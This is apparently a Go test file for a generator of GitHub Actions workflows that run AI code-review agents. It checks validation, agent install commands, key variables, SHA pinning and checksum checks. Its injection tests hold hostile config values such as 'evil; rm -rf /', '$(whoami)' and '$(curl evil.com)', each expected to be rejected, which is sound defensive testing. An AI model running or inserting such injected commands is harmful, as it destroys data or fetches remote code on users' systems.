package ghaction

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	if cfg.Agent != "codex" {
		t.Errorf("expected default agent 'codex', got %q", cfg.Agent)
	}
	if cfg.Reasoning != "thorough" {
		t.Errorf("expected default reasoning 'thorough', got %q", cfg.Reasoning)
	}
	if cfg.SecretName != "ROBOREV_API_KEY" {
		t.Errorf("expected default secret 'ROBOREV_API_KEY', got %q", cfg.SecretName)
	}
	if len(cfg.ReviewTypes) != 1 || cfg.ReviewTypes[0] != "security" {
		t.Errorf("expected default review types [security], got %v", cfg.ReviewTypes)
	}
}

func TestValidate(t *testing.T) {
	tests := []struct {
		name    string
		cfg     WorkflowConfig
		wantErr string
	}{
		{
			name: "valid default",
			cfg:  DefaultConfig(),
		},
		{
			name:    "invalid agent",
			cfg:     WorkflowConfig{Agent: "evil; rm -rf /", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY"},
			wantErr: "invalid agent",
		},
		{
			name:    "invalid reasoning",
			cfg:     WorkflowConfig{Agent: "codex", Reasoning: "$(whoami)", ReviewTypes: []string{"security"}, SecretName: "KEY"},
			wantErr: "invalid reasoning",
		},
		{
			name:    "invalid review type",
			cfg:     WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"'; drop table"}, SecretName: "KEY"},
			wantErr: "invalid review type",
		},
		{
			name:    "invalid secret name with spaces",
			cfg:     WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "MY SECRET"},
			wantErr: "invalid secret name",
		},
		{
			name:    "invalid secret name with injection",
			cfg:     WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY}} && echo pwned"},
			wantErr: "invalid secret name",
		},
		{
			name:    "invalid version",
			cfg:     WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY", RoborevVersion: "$(curl evil.com)"},
			wantErr: "invalid roborev version",
		},
		{
			name:    "invalid model",
			cfg:     WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY", Model: "$(whoami)"},
			wantErr: "invalid model",
		},
		{
			name: "valid version",
			cfg:  WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY", RoborevVersion: "0.33.1"},
		},
		{
			name: "valid model with slashes",
			cfg:  WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY", Model: "anthropic/claude-sonnet-4-5-20250929"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.cfg.Validate()
			if tt.wantErr != "" {
				if err == nil {
					t.Fatal("expected error")
				}
				if !strings.Contains(err.Error(), tt.wantErr) {
					t.Errorf("error %q should contain %q", err.Error(), tt.wantErr)
				}
			} else if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
		})
	}
}

func TestGenerate_DefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	checks := []string{
		"name: roborev",
		"pull_request:",
		"Install roborev",
		"Install agent",
		"Run review",
		"--agent codex",
		"--reasoning thorough",
		"OPENAI_API_KEY",
		"secrets.ROBOREV_API_KEY",
		"--type security",
		"--local",
		"actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
		"sha256sum --check",
		"set -euo pipefail",
	}
	for _, check := range checks {
		if !strings.Contains(out, check) {
			t.Errorf("output missing %q", check)
		}
	}

	// Verify no old broken patterns
	broken := []string{
		"--commit",
		"--format json",
		"comment --pr",
		"actions/checkout@v4",
	}
	for _, b := range broken {
		if strings.Contains(out, b) {
			t.Errorf("output should not contain %q", b)
		}
	}
}

func TestGenerate_ClaudeAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agent:       "claude-code",
		ReviewTypes: []string{"security", "design"},
		Reasoning:   "standard",
		SecretName:  "MY_CLAUDE_KEY",
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "ANTHROPIC_API_KEY") {
		t.Error("expected ANTHROPIC_API_KEY for claude-code agent")
	}
	if !strings.Contains(out, "secrets.MY_CLAUDE_KEY") {
		t.Error("expected custom secret name")
	}
	if !strings.Contains(out, "--agent claude-code") {
		t.Error("expected --agent claude-code")
	}
	if !strings.Contains(out, "--reasoning standard") {
		t.Error("expected --reasoning standard")
	}
	if !strings.Contains(out, "npm install -g @anthropic-ai/claude-code@latest") {
		t.Error("expected claude-code install command")
	}
	// Two separate review commands for two types
	if !strings.Contains(out, "--type security") {
		t.Error("expected --type security")
	}
	if !strings.Contains(out, "--type design") {
		t.Error("expected --type design")
	}
}

func TestGenerate_GeminiAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agent:       "gemini",
		ReviewTypes: []string{"design"},
		Reasoning:   "fast",
		SecretName:  "GEMINI_KEY",
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "GOOGLE_API_KEY") {
		t.Error("expected GOOGLE_API_KEY for gemini agent")
	}
	if !strings.Contains(out, "--agent gemini") {
		t.Error("expected --agent gemini")
	}
	if !strings.Contains(out, "--type design") {
		t.Error("expected --type design")
	}
	if !strings.Contains(out, "@google/gemini-cli@latest") {
		t.Error("expected @google/gemini-cli install command")
	}
}

func TestGenerate_CopilotAgent(t *testing.T) {
	cfg := WorkflowConfig{
		Agent:       "copilot",
		ReviewTypes: []string{"security"},
		Reasoning:   "thorough",
		SecretName:  "ROBOREV_API_KEY",
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "GITHUB_TOKEN") {
		t.Error("expected GITHUB_TOKEN for copilot agent")
	}
	if !strings.Contains(out, "npm install -g @github/copilot@latest") {
		t.Error("expected npm install for copilot CLI")
	}
}

func TestGenerate_WithModel(t *testing.T) {
	cfg := WorkflowConfig{
		Agent:       "codex",
		Model:       "gpt-5.2-codex",
		ReviewTypes: []string{"security"},
		Reasoning:   "thorough",
		SecretName:  "ROBOREV_API_KEY",
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "--model gpt-5.2-codex") {
		t.Error("expected --model flag in output")
	}
}

func TestGenerate_WithoutModel(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if strings.Contains(out, "--model") {
		t.Error("expected no --model flag when model is empty")
	}
}

func TestGenerate_PinnedVersion(t *testing.T) {
	cfg := DefaultConfig()
	cfg.RoborevVersion = "0.33.1"
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, `ROBOREV_VERSION="0.33.1"`) {
		t.Error("expected pinned version in output")
	}
	if strings.Contains(out, "api.github.com") {
		t.Error("pinned version should not query GitHub API for latest")
	}
}

func TestGenerate_LatestVersion(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "api.github.com") {
		t.Error("expected GitHub API call for latest version")
	}
}

func TestGenerate_EmptyFields(t *testing.T) {
	cfg := WorkflowConfig{}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "--agent codex") {
		t.Error("expected default agent codex")
	}
	if !strings.Contains(out, "--reasoning thorough") {
		t.Error("expected default reasoning thorough")
	}
	if !strings.Contains(out, "secrets.ROBOREV_API_KEY") {
		t.Error("expected default secret name")
	}
}

func TestGenerate_DefaultReviewType_NoTypeFlag(t *testing.T) {
	cfg := WorkflowConfig{
		Agent:       "codex",
		ReviewTypes: []string{"default"},
		Reasoning:   "thorough",
		SecretName:  "ROBOREV_API_KEY",
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	// "default" review type should not emit --type flag
	if strings.Contains(out, "--type") {
		t.Error("'default' review type should not produce --type flag")
	}
}

func TestGenerate_MultipleReviewTypes_SeparateCommands(t *testing.T) {
	cfg := WorkflowConfig{
		Agent:       "codex",
		ReviewTypes: []string{"security", "design"},
		Reasoning:   "thorough",
		SecretName:  "ROBOREV_API_KEY",
	}
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	// Should have separate review commands, not comma-joined
	if strings.Contains(out, "security,design") {
		t.Error("review types should not be comma-joined")
	}
	if !strings.Contains(out, "--type security") {
		t.Error("expected --type security as separate command")
	}
	if !strings.Contains(out, "--type design") {
		t.Error("expected --type design as separate command")
	}
}

func TestGenerate_UsesLocalMode(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "--local") {
		t.Error("expected --local flag for CI (no daemon)")
	}
}

func TestGenerate_PostResults_ValidCLI(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if strings.Contains(out, "list --format json") {
		t.Error("should use 'list --json' not 'list --format json'")
	}
	if strings.Contains(out, "comment --pr") {
		t.Error("should not use non-existent 'comment --pr' interface")
	}
	if !strings.Contains(out, "list --json") {
		t.Error("expected 'roborev list --json' in post results")
	}
}

func TestGenerate_SupplyChainHardening(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if strings.Contains(out, "actions/checkout@v4") {
		t.Error("checkout should be pinned to SHA, not tag")
	}
	if !strings.Contains(out, "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd") {
		t.Error("checkout should be pinned to SHA")
	}
	if !strings.Contains(out, "sha256sum --check") {
		t.Error("expected checksum verification for roborev download")
	}
	if strings.Contains(out, "--ignore-missing") {
		t.Error("should not use --ignore-missing (can pass vacuously)")
	}
	if !strings.Contains(out, `grep "${ARCHIVE}" checksums.txt`) {
		t.Error("expected grep to extract matching checksum line")
	}
}

func TestGenerate_InstallPath(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if strings.Contains(out, "/usr/local/bin") {
		t.Error("should not install to /usr/local/bin (may lack permissions)")
	}
	if !strings.Contains(out, `"$HOME/.local/bin"`) {
		t.Error("expected install to $HOME/.local/bin")
	}
	if !strings.Contains(out, "$GITHUB_PATH") {
		t.Error("expected $HOME/.local/bin added to GITHUB_PATH")
	}
}

func TestGenerate_VersionPinningComment(t *testing.T) {
	cfg := DefaultConfig()
	out, err := Generate(cfg)
	if err != nil {
		t.Fatalf("Generate failed: %v", err)
	}

	if !strings.Contains(out, "Pin agent CLI versions") {
		t.Error("expected version pinning comment in workflow")
	}
}

func TestAgentInstallCmd_CorrectPackageNames(t *testing.T) {
	// Cross-reference install commands with expected package names
	// to catch typosquatting or incorrect package references.
	tests := []struct {
		agent       string
		wantPkg     string
		notWantPkgs []string
	}{
		{
			agent:       "gemini",
			wantPkg:     "@google/gemini-cli",
			notWantPkgs: []string{"@anthropic-ai/gemini"},
		},
		{
			agent:   "claude-code",
			wantPkg: "@anthropic-ai/claude-code",
		},
		{
			agent:   "codex",
			wantPkg: "@openai/codex",
		},
		{
			agent:       "copilot",
			wantPkg:     "@github/copilot",
			notWantPkgs: []string{"gh extension install"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			cmd := agentInstallCmd(tt.agent)
			if !strings.Contains(cmd, tt.wantPkg) {
				t.Errorf("agentInstallCmd(%q) = %q, want package %q",
					tt.agent, cmd, tt.wantPkg)
			}
			for _, bad := range tt.notWantPkgs {
				if strings.Contains(cmd, bad) {
					t.Errorf("agentInstallCmd(%q) = %q, should NOT contain %q",
						tt.agent, cmd, bad)
				}
			}
		})
	}
}

func TestGenerate_Injection_Rejected(t *testing.T) {
	tests := []struct {
		name string
		cfg  WorkflowConfig
	}{
		{
			name: "agent injection",
			cfg:  WorkflowConfig{Agent: "codex; rm -rf /", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY"},
		},
		{
			name: "secret injection",
			cfg:  WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY}} && echo pwned"},
		},
		{
			name: "version injection",
			cfg:  WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY", RoborevVersion: "1.0.0$(curl evil)"},
		},
		{
			name: "model injection",
			cfg:  WorkflowConfig{Agent: "codex", Reasoning: "thorough", ReviewTypes: []string{"security"}, SecretName: "KEY", Model: "model; rm -rf /"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Generate(tt.cfg)
			if err == nil {
				t.Fatal("expected Generate to reject injected config")
			}
		})
	}
}

func TestWriteWorkflow_CreatesFile(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, ".github", "workflows", "roborev.yml")

	cfg := DefaultConfig()
	if err := WriteWorkflow(cfg, outPath, false); err != nil {
		t.Fatalf("WriteWorkflow failed: %v", err)
	}

	content, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatalf("read file: %v", err)
	}
	if !strings.Contains(string(content), "name: roborev") {
		t.Error("written file should contain workflow name")
	}
}

func TestWriteWorkflow_ExistingFile_NoForce(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "roborev.yml")

	if err := os.WriteFile(outPath, []byte("existing"), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := DefaultConfig()
	err := WriteWorkflow(cfg, outPath, false)
	if err == nil {
		t.Fatal("expected error for existing file without --force")
	}
	if !strings.Contains(err.Error(), "already exists") {
		t.Errorf("expected 'already exists' error, got: %v", err)
	}

	content, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(content) != "existing" {
		t.Error("existing file content should be preserved")
	}
}

func TestWriteWorkflow_ExistingFile_Force(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "roborev.yml")

	if err := os.WriteFile(outPath, []byte("existing"), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := DefaultConfig()
	if err := WriteWorkflow(cfg, outPath, true); err != nil {
		t.Fatalf("WriteWorkflow with force failed: %v", err)
	}

	content, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(content) == "existing" {
		t.Error("force should have overwritten existing content")
	}
	if !strings.Contains(string(content), "name: roborev") {
		t.Error("overwritten file should contain workflow name")
	}
}

func TestAgentEnvVar(t *testing.T) {
	tests := []struct {
		agent string
		want  string
	}{
		{"codex", "OPENAI_API_KEY"},
		{"claude-code", "ANTHROPIC_API_KEY"},
		{"gemini", "GOOGLE_API_KEY"},
		{"copilot", "GITHUB_TOKEN"},
		{"opencode", "OPENAI_API_KEY"},
		{"droid", "OPENAI_API_KEY"},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			got := agentEnvVar(tt.agent)
			if got != tt.want {
				t.Errorf("agentEnvVar(%q) = %q, want %q", tt.agent, got, tt.want)
			}
		})
	}
}

func TestAgentInstallCmd(t *testing.T) {
	tests := []struct {
		agent    string
		contains string
	}{
		{"codex", "npm install -g @openai/codex@latest"},
		{"claude-code", "npm install -g @anthropic-ai/claude-code@latest"},
		{"copilot", "npm install -g @github/copilot@latest"},
		{"cursor", "not available in CI"},
		{"gemini", "npm install -g @google/gemini-cli@latest"},
		{"droid", "droid-cli"},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			got := agentInstallCmd(tt.agent)
			if !strings.Contains(got, tt.contains) {
				t.Errorf("agentInstallCmd(%q) = %q, want to contain %q", tt.agent, got, tt.contains)
			}
		})
	}
}
